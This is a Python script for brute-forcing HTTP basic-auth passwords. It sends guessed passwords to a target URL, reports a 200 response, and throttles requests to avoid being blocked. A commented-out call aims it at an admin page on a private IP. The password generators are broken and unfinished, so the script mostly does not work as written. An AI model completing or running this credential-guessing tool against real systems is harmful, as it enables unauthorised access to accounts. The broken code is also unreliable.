import requests
from time import sleep
from itertools import combinations
from typing import Generator, Union

def ree(max=3, cur=[], start=32, end=127, index=0):
    if len(cur) == max: return "finished"
    else: cur = [start] ## First init
    if cur[index] == end: 
        cur.append(start)
        yield cur
        index += 1
        ree(max, cur, start, end, index)
    else:
        yield cur
        cur[index] += 1
        ree(max, cur, start, end, index)

def pwd_gen(pwd_len: int = 2, current_iter: list = [], chars: Generator = [chr(c) for c in range(32,127)]) -> list:

    yield '' ##Check if pwd is nothing
    if pwd_len == len(current_iter):
        return
    else:
        current_iter.append(0) 

def atk(url: str = "", user: str = "admin", limit: Union[int, float] = 0.2, pwd_len: int = 2) -> None:
    """Guesses passwords for a given URL

    Args:
        url (str, required): -> Defaults to "".
            The URL you want to guess the pwd.            
        user (str, optional): -> Defaults to "admin"
            Ther user you are trying to guess the pwd.
        limit (float | int, optional): -> Defaults to 0.2 seconds
            Rate in seconds. To low and you might get blocked.
    
    Returns:
        None -> prints any 200 reponse and the given pwd to terminal
    """
    for attempt_number, pwd_guess in enumerate(pwd_gen(pwd_len)):
        res = requests.get(url, auth=("admin", pwd_guess))
        if res.status_code == 200:
            print("Got 200 reponse on pwd: {}".format(pwd_guess))
            exit()
        if res.status_code != 401:
            print("Got status code of: {}".format(res.status_code))
        print("Attempt #{} Pwd -> {} Got status: {}".format(attempt_number, pwd_guess, res.status_code))
        sleep(limit)


#atk(url="http://192.168.2.33/admin/", user="admin", limit=0.3, pwd_len=12)

ree()